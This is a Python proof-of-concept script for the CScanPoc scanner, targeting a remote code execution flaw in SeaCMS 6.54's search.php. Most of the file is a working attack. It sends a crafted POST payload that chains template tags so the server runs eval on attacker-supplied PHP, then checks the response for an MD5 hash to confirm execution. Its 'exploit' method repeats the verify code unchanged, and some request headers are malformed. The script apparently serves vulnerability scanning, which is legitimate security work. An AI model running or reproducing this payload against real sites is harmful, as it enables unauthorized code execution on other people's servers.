# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'SEACMS_0002_p'  # 平台漏洞编号，留空
    name = '海洋CMS 6.54 前台命名执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-10-11'  # 漏洞公布时间
    desc = '''
        SeaCMS是一套使用PHP编写的免费、开源的网站内容管理系统。该系统主要被设计用来管理视频点播资源。
        漏洞的初始接口在 ./search.php文件中。
        该漏洞成因在于search.php没有对用户输入内容进行过滤，导致攻击者提交的order参数可进入parseIf函数中执行eval.
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1967.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SEACMS(海洋CMS)'  # 漏洞应用名称
    product_version = '6.54'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c5dfe20c-80d8-4e63-94df-52529a397a10'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://cloud.tencent.com/developer/article/1045776
            # 根据安装目录不同payload可能不同，需根据实际情况判断
            payload = '/seacms_upload/search.php'
            header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate Content-Type: application/x-www-form-urlencoded',
                'Content-Length': '208',
                'Connection': 'keep-alive'
            }
            data = 'Upgrade-Insecure-Requests: 1 searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ec&9[]=ho(md5(c));'
            url = self.target + payload
            r = requests.post(url, headers=header, data=data)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据安装目录不同payload可能不同，需根据实际情况判断
            payload = '/seacms_upload/search.php'
            header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate Content-Type: application/x-www-form-urlencoded',
                'Content-Length': '208',
                'Connection': 'keep-alive'
            }
            data = 'Upgrade-Insecure-Requests: 1 searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ec&9[]=ho(md5(c));'
            url = self.target + payload
            r = requests.post(url, headers=header, data=data)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
